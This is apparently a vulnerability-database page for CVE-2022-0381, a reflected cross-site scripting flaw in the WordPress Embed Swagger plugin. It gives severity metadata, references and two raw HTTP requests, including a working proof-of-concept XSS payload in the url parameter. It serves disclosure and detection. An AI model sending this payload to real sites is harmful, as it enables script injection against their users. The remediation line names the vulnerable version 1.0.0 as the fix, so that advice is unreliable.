---
layout: post
cve_id: CVE-2022-0381
title: WordPress Embed Swagger <=1.0.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0381.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0381.yaml
snort2_rule: N/A
snort3_rule: N/A
author: edoardottt
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, potentially
  leading to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Update to the latest version of the WordPress Embed Swagger plugin (1.0.0)
  or apply a patch provided by the vendor.

  '
reference:
- https://gist.github.com/Xib3rR4dAr/4b3ea7960914e23c3a875b973a5b37a3
- https://www.wordfence.com/vulnerability-advisories/#CVE-2022-0381
- https://nvd.nist.gov/vuln/detail/CVE-2022-0381
- https://plugins.trac.wordpress.org/browser/embed-swagger/trunk/swagger-iframe.php#L59
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-0381
  cwe-id: CWE-79
  epss-score: 0.07802
  epss-percentile: 0.91693
  cpe: cpe:2.3:a:embed_swagger_project:embed_swagger:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  vendor: embed_swagger_project
  product: embed_swagger
  framework: wordpress
tags:
- cve
- cve2022
- swagger
- xss
- wordpress
- embed_swagger_project
- vuln
---

## ðŸ” Vulnerability Description
WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/embed-swagger/readme.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

